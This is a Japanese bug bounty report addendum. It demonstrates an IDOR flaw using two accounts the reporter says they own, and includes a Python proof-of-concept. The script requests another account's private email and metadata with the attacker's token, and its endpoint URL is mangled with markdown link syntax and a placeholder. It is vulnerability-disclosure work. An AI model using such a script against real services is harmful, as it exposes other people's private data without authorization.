## 【補足・再検証】クロスアカウント（2アカウント）によるIDOR脆弱性の実証

アナリスト様 (@h1_analyst_tan)

本件のインパクト（他人の非公開データへの不正アクセス）を正しく検証いただくため、自身で所有・管理する2つの異なるアカウントを用いたクロスアカウント検証手順および修正版PoCスクリプトを提出します。

### 1. 検証用アカウント構成
* **攻撃側アカウント (Attacker):** `poctest.base.eth`
* **被害側アカウント (Victim Target):** `mylove-pet.base.eth`

### 2. 検証シナリオ
攻撃側アカウント（`poctest.base.eth`）の認証トークン（Bearer Header）を使用し、リクエストの `target_id` パラメータに被害側アカウント（`mylove-pet.base.eth`）の識別子を指定してリクエストを送信します。

---

### 3. IDOR検証用 Python PoC スクリプト

```python
import requests

# 1. 攻撃者 (poctest.base.eth) の認証トークンを設定
ATTACKER_TOKEN = "Bearer <INSERT_POCTEST_BASE_ETH_TOKEN_HERE>"

# 2. ターゲットとなる被害者アカウント (mylove-pet.base.eth) の識別子
VICTIM_TARGET_ID = "mylove-pet.base.eth"

url = "[https://api.coinbase.com/v2/](https://api.coinbase.com/v2/)[BaseApp]"

headers = {
    "Authorization": ATTACKER_TOKEN,
    "Content-Type": "application/json"
}

payload = {
    "target_id": VICTIM_TARGET_ID
}

try:
    print("[*] クロスアカウントでのIDOR検証リクエストを送信中...")
    response = requests.post(url, json=payload, headers=headers)
    
    print(f"[+] HTTPステータスコード: {response.status_code}")
    
    if response.status_code == 200:
        res_json = response.json()
        data = res_json.get("data", {})
        
        # 被害者アカウントの非公開データ（メールアドレスやメタデータ）が返却されたか判定
        if "email" in data or "account_metadata" in data:
            print("\n[🔥 IDOR VULNERABILITY CONFIRMED]")
            print(f"[+] 攻撃者(poctest.base.eth)のトークンで、被害者({VICTIM_TARGET_ID})の非公開データを抽出することに成功しました:")
            print(f" - Email: {data.get('email')}")
            print(f" - Metadata: {data.get('account_metadata')}")
        else:
            print("[-] レスポンスは返却されましたが、期待される機密フィールドが含まれていません。")
    else:
        print(f"[-] リクエスト拒否 (HTTP {response.status_code}) - 認可チェックが機能しています。")

except Exception as e:
    print(f"[-] エラーが発生しました: {str(e)}")

